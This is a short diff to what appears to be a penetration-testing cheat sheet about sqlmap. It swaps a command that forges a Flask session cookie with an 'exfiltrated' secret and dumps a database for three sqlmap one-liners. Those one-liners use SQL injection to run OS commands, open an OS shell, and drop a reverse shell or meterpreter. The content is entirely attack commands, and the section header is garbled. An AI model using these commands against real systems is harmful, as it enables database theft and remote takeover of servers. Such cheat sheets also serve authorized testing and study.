@@ -137,5 +137,12 @@ sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; sessio
 
 <b> Implementing Shell Unix in Linux </b>
 ```python
-sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
+#Exec command
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
+
+#Simple Shell
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
+
+#Dropping a reverse-shell / meterpreter
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
 ```
